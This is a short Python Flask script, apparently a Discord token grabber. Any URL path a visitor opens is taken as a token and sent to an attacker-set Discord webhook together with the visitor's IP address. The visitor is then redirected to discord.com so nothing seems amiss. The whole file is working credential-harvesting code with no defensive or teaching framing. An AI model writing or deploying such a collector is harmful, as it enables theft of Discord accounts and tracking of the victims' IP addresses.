from flask import Flask, redirect,request
from dhooks import Webhook
import requests
app = Flask(__name__)
hook = Webhook('YOUR WEBHOOK')
@app.route('/')
def main():


  return redirect("https://discord.com/app")
@app.route('/<string:test>')
def index(test):
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        publicip = request.environ['REMOTE_ADDR']
    else:
        publicip = request.environ['HTTP_X_FORWARDED_FOR']    
   
    hook.send('Token: `'+test+'`\nIp: `'+publicip+'`')
    return redirect("https://discord.com/app")


app.run(host='0.0.0.0', port=81)
